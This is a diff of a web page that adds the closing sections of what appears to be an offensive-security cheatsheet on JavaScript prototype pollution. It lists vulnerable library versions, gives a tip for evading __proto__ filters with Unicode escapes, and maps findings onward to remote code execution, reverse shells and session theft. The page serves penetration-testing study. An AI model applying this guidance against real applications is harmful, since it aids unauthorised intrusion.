-          <nav class="cheatsheet-pager is-prev-only" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web14-deserialization/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">Deserialization</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+</code></pre><p>JSON parsers accept Unicode escapes that don&rsquo;t appear as <code>__proto__</code> in string scanning.</p><h2 id=ix-library-specific-notes data-heading-permalink=true><span class=heading-content>ix. Library-specific notes</span>
+<a class=heading-permalink href=#ix-library-specific-notes aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><table><thead><tr><th>Library</th><th>Note</th></tr></thead><tbody><tr><td>lodash &lt; 4.17.5</td><td><code>_.merge</code>, <code>_.set</code>, <code>_.defaultsDeep</code> all vulnerable</td></tr><tr><td>lodash >= 4.17.12</td><td><code>__proto__</code> blocked, <code>constructor.prototype</code> still works in some versions</td></tr><tr><td>jQuery &lt; 3.4.0</td><td><code>$.extend(true, ...)</code> vulnerable</td></tr><tr><td>express-validator &lt; 6.6.1</td><td>Body sanitization PP</td></tr><tr><td>qs (via Express) &lt; 6.7.3</td><td>Query parsing PP</td></tr><tr><td>mongoose &lt; 6.4.6</td><td>Document.toObject PP gadget</td></tr><tr><td>dot-prop &lt; 5.1.1</td><td>All set ops vulnerable</td></tr><tr><td>handlebars</td><td>Multiple gadgets per version</td></tr><tr><td>ejs</td><td>Polluted options → RCE</td></tr></tbody></table><p>Check <code>package-lock.json</code> if you have source access. The vulnerable version is often still pinned.</p><h2 id=x-references data-heading-permalink=true><span class=heading-content>x. References</span>
+<a class=heading-permalink href=#x-references aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li><a href=https://portswigger.net/web-security/prototype-pollution target=_blank rel="noopener noreferrer">PortSwigger - Prototype pollution</a></li><li><a href=https://portswigger.net/web-security/prototype-pollution/server-side target=_blank rel="noopener noreferrer">PortSwigger - Server-side prototype pollution</a></li><li><a href=https://portswigger.net/web-security/prototype-pollution/client-side target=_blank rel="noopener noreferrer">PortSwigger - Client-side prototype pollution</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution target=_blank rel="noopener noreferrer">PayloadsAllTheThings - Prototype Pollution</a></li><li><a href=https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution target=_blank rel="noopener noreferrer">HackTricks - NodeJS proto/prototype pollution</a></li><li><a href=https://github.com/y0gii/Server-Side-Prototype-Pollution-Gadgets target=_blank rel="noopener noreferrer">Server-Side PP Gadgets</a></li><li><a href=https://github.com/BlackFan/client-side-prototype-pollution target=_blank rel="noopener noreferrer">Client-Side PP database</a></li><li><a href=https://portswigger.net/burp/documentation/desktop/tools/dom-invader target=_blank rel="noopener noreferrer">DOM Invader docs</a></li></ul><h2 id=xi-where-it-leads data-heading-permalink=true><span class=heading-content>xi. Where it leads</span>
+<a class=heading-permalink href=#xi-where-it-leads aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>Server-side RCE via gadget → standard Node.js foothold → <a href=/cheatsheets/linux-pentesting/03-shell--tooling/>03 Shell & Tooling</a>
+/ <a href=/cheatsheets/misc/reverse-shells/>Reverse Shells</a></li><li>Client-side XSS via gadget → session theft → see <a href=/cheatsheets/web/web08-xss/>WEB08 XSS</a></li><li>Auth bypass (isAdmin pollution) → privilege escalation in-app</li><li>Data exposure (default property pollution affects queries/serialization)</li></ul><p>Prototype pollution sits between deserialization and XSS - JavaScript-specific, requires gadgets, but a top-tier finding when it lands because it&rsquo;s wide-ranging and often missed by AppSec scanners.</p></div><nav class="cheatsheet-pager is-prev-only" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/web/web14-deserialization/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>Deserialization</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
